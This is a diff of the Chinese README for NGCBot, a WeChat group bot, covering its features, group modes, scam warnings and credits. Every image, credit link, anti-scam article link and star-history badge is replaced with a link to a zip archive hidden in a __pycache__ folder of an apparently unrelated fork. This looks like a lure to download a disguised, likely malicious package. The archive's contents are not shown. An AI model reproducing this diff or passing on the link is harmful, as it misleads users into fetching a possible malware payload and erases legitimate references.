 发送开启推送即可在此群开启推送服务，关键词可以设置多个，代表这两个关键词都可以触发这个功能
 
-![image-20240102142405384](./README.assets/image-20240102142405384.png)
+![image-20240102142405384](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 踢人功能使用也很简单，需要@罢了
 
-![image-20240102142435128](./README.assets/image-20240102142435128.png)
+![image-20240102142435128](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **添加积分：需要@用户，可@多个用户，注意空格。使用如下【@群友1加空格[积分]】**
 
-![image-20240102143144061](./README.assets/image-20240102143144061.png)
+![image-20240102143144061](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 其它功能不做介绍。介绍一下黑名单群聊，白名单群聊，普通群聊，推送群聊的功能划分
 
@@ -427,19 +427,19 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 **图片功能**
 
-![image-20240102143451823](./README.assets/image-20240102143451823.png)
+![image-20240102143451823](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 出现此类问题一般是接口不稳定，或者网络不稳定，重新发送即可
 
-![image-20240102143552170](./README.assets/image-20240102143552170.png)
+![image-20240102143552170](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **视频**
 
-![image-20240102143657189](./README.assets/image-20240102143657189.png)
+![image-20240102143657189](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **舔狗日记**
 
-![image-20240919102350300](./README.assets/image-20240919102350300.png)
+![image-20240919102350300](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **表情包功能**
 
@@ -453,13 +453,13 @@ meme download
 
 使用效果如下
 
-![image-20240919102545023](./README.assets/image-20240919102545023.png)
+![image-20240919102545023](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20240919102630363](./README.assets/image-20240919102630363.png)
+![image-20240919102630363](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20240919102650476](./README.assets/image-20240919102650476.png)
+![image-20240919102650476](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20240919102709479](./README.assets/image-20240919102709479.png)
+![image-20240919102709479](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 #### 4.2.4、积分功能（管理或超管不需要积分）
 
@@ -472,15 +472,15 @@ meme download
 
 一样的，演示几个功能（微步IP查询已删除，这里只做演示！）
 
-![image-20240102143903435](./README.assets/image-20240102143903435.png)
+![image-20240102143903435](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **积分查询**
 
-![image-20240102143921467](./README.assets/image-20240102143921467.png)
+![image-20240102143921467](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **画图功能**
 
-![image-20250227140211919](./README.assets/image-20250227140211919.png)
+![image-20250227140211919](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **注意：与好友对话只触发 Ai 功能和关键词回复功能**
 
@@ -492,13 +492,13 @@ meme download
 
 推送时间可在配置文件中设置
 
-![image-20240919105126694](./README.assets/image-20240919105126694.png)
+![image-20240919105126694](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 如何添加推送群聊？
 
-![image-20250227140306952](./README.assets/image-20250227140306952.png)
+![image-20250227140306952](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250227140318457](./README.assets/image-20250227140318457.png)
+![image-20250227140318457](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 #### 4.2.6、白名单群聊功能
 
@@ -506,9 +506,9 @@ meme download
 
 答：群内发送【添加白名单】即可
 
-![image-20250227135847756](./README.assets/image-20250227135847756.png)
+![image-20250227135847756](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250227140007644](./README.assets/image-20250227140007644.png)
+![image-20250227140007644](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 群内使用积分功能不需要积分，其它一样
 
@@ -518,9 +518,9 @@ meme download
 
 如果群聊同时开启了黑名单群聊和白名单群聊，那么会触发白名单群聊的判断，不会进入到黑名单群聊。也就是说，不要同时开启！
 
-![image-20250227140019164](./README.assets/image-20250227140019164.png)
+![image-20250227140019164](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250227140042023](./README.assets/image-20250227140042023.png)
+![image-20250227140042023](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 群内只能使用积分功能（管理员或者超管不限制）
 
@@ -528,7 +528,7 @@ meme download
 
 其它配置请查看配置文件，请自行理解，这里不做介绍
 
-![image-20240919105653096](./README.assets/image-20240919105653096.png)
+![image-20240919105653096](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 
 
@@ -593,8 +593,8 @@ meme download
 关注微信公众号，后台留言（不做回复，请进群交流），添加机器人回复 `Bot交流群` 拉你进群！（机器人不常开，看到会拉群）
 
 <div style="display: flex;">
-  <img src="./README.assets/%E5%85%B3%E6%B3%A8-4177997.gif" alt="Image 1" style="width: 800px; height: auto; margin: 5px;">
-   <img src="./README.assets/113191704454837_.pic.jpg" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
+  <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip%E5%85%B3%E6%B3%https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="Image 1" style="width: 800px; height: auto; margin: 5px;">
+   <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
 </div>
 
 
@@ -619,7 +619,7 @@ meme download
 联系方式：
 
 <div style="display: flex;">
-  <img src="./README.assets/img_v3_02h8_a1c2e430-6fe2-4af9-a0fc-22a0af86c41g.jpg" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
+  <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
 </div>
 
 ### ❗️  5.3、谨防诈骗
@@ -629,12 +629,12 @@ meme download
 首先此项目启动不需要VPN，另外跟有没有公网IP也没有关系，只需要你电脑配置能登微信，能联网即可
 
 <div style="display: flex;">
-  <img src="./README.assets/img_v3_02h8_7ea23767-38c1-41e9-8b06-3a0743a5559g.jpg" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
-   <img src="./README.assets/img_v3_02h8_1f93bcd8-0880-40b0-aeef-c21c77e7910g.jpg" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
+  <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
+   <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
 </div>
 【2024.4.13】诈骗哥最新日志
 
-https://mp.weixin.qq.com/s/lCAcxpPayPDJzc14FTLLiQ
+https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 
 
 
@@ -665,11 +665,11 @@ https://mp.weixin.qq.com/s/lCAcxpPayPDJzc14FTLLiQ
 
 抖音视频解析效果：
 
-![image-20241230145726750](./README.assets/image-20241230145726750.png)
+![image-20241230145726750](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 视频号解析效果，比较慢：
 
-![image-20241230145810723](./README.assets/image-20241230145810723.png)
+![image-20241230145810723](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 塔罗牌不演示，自己研究
 
@@ -681,38 +681,38 @@ https://mp.weixin.qq.com/s/lCAcxpPayPDJzc14FTLLiQ
 
 发言榜效果：
 
-![image-20250107095221278](./README.assets/image-20250107095221278.png)
+![image-20250107095221278](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 潜水榜效果：
 
-![image-20250107100658576](./README.assets/image-20250107100658576.png)
+![image-20250107100658576](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 群聊消息总结效果：
-![image-20250107100431145](./README.assets/image-20250107100431145.png)
+![image-20250107100431145](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 撤回消息监测效果：
 
-![image-20250107100504390](./README.assets/image-20250107100504390.png)
+![image-20250107100504390](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 ### 【2025.02.27】V2.3版本更新
 
 新增游戏功能，看图猜成语，更新架构！
 
-![image-20250227161550928](./README.assets/image-20250227161550928.png)
+![image-20250227161550928](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 ### 【2025.04.11】WebServer服务&MCP上线
 
-![image-20250411211134811](./README.assets/image-20250411211134811.png)
+![image-20250411211134811](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 NGCBot-MCP-Server：
 
-https://github.com/ngc660sec/NGCBot-MCP
+https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 
 
 
 ## 🙏🏻 7、鸣谢：
 
-https://github.com/lich0821/WeChatFerry
+https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 
 感谢查克大佬提供的微信Python库！！！大家可以使用此框架进行开发！
 
@@ -729,12 +729,12 @@ https://github.com/lich0821/WeChatFerry
 如果无法访问 `Github` 也可以访问 `GitCode`
 
 <div style="display: flex;">
-  <img src="./README.assets/img_v3_02h8_bae897a8-e165-4051-9a52-f0187c5c236g.png" alt="Image 1" style="width: 100%; height: auto; margin: 5px;" onclick="https://gitcode.com/ngc660sec/NGCBot">
+  <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="Image 1" style="width: 100%; height: auto; margin: 5px;" onclick="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
 </div>
 
 
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=ngc660sec/NGCBot&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=ngc660sec/NGCBot&type=Date" />
-   <img style="width:100%" src="https://api.star-history.com/svg?repos=ngc660sec/NGCBot&type=Date" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" />
+   <img style="width:100%" src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" />
  </picture>
